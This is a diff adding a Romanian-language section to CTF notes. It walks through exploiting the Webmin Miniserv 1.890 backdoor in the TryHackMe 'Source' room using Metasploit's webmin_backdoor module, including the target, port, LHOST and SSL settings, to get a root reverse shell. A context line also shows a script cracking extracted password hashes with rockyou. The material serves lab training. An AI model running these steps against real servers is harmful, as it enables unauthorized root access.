@@ -564,4 +564,73 @@ python2 46635.py -u http://<IP_TINTA>/simple/ --crack -w /usr/share/wordlists/ro
 *   `--crack`: Indică scriptului să încerce decriptarea hash-ului imediat ce este extras din baza de date.
 *   `-w`: Specifică calea către dicționarul de parole (`rockyou.txt`).
 
+---
+
+## 15. Exploatarea Webmin prin Metasploit (Miniserv 1.890)
+
+În camera **Source** de pe TryHackMe, în faza de scanare web este identificat panoul de administrare **Webmin** care rulează versiunea vulnerabilă **Miniserv 1.890**. Această versiune conține o vulnerabilitate critică de tip **RCE (Remote Code Execution)** prin backdoor, ce permite executarea de comenzi direct cu drepturi de `root`.
+
+---
+
+### 🚀 Etapele de Exploatare în Metasploit
+
+Datorită impactului acestei vulnerabilități, framework-ul Metasploit are un modul dedicat gata implementat.
+
+#### 1. Lansarea Metasploit
+Deschide terminalul și pornește consola Metasploit:
+```bash
+msfconsole
+```
+
+#### 2. Căutarea și Selectarea Modulului
+Caută modulul specific pentru backdoor-ul Webmin:
+```msf
+search webmin_backdoor
+```
+
+Sistemul va returna modulul de tip exploit. Selectează-l folosind comanda:
+```msf
+use exploit/linux/http/webmin_backdoor
+```
+
+---
+
+### ⚙️ Configurarea Opțiunilor (Parameters)
+
+Pentru ca exploit-ul să poată comunica corect cu serverul țintă, trebuie setați parametrii de rețea. 
+
+*   **Setați IP-ul mașinii țintă:**
+    ```msf
+    set RHOSTS <IP_TINTA>
+    ```
+*   **Setați portul specific pe care rulează Webmin (implicit 10000):**
+    ```msf
+    set RPORT 10000
+    ```
+*   **Setați IP-ul tău local de atac (interfața `tun0` din VPN):**
+    ```msf
+    set LHOST <IP_ATACATOR_KALI>
+    ```
+
+#### ⚠️ Pasul Critic: Activarea SSL (`ssl true`)
+Serviciul Webmin pe camera *Source* este configurat implicit să folosească conexiuni securizate HTTPS (nu HTTP simplu). Dacă omiți acest pas, Metasploit va trimite cereri HTTP chioare, iar serverul va refuza conexiunea sau nu va procesa payload-ul.
+
+```msf
+set ssl true
+```
+*Această comandă forțează Metasploit să inițieze o conexiune criptată (SSL/TLS) către portul 10000 înainte de a trimite payload-ul.*
+
+---
+
+### 💥 Executarea Atacului
+
+Odată ce toate opțiunile au fost verificate (`show options`), rulează exploit-ul:
+```msf
+exploit
+```
+*Sau folosește comanda alternativă `run`.*
+
+Dacă exploit-ul are succes, modulul va profita de vulnerabilitate și va deschide automat o sesiune de tip **Meterpreter** sau un **Reverse Shell** direct cu drepturi de **root**, ocolind complet faza de Escaladare a Privilegiilor (deoarece serviciul `miniserv` rula deja ca root pe server).
+
+
 
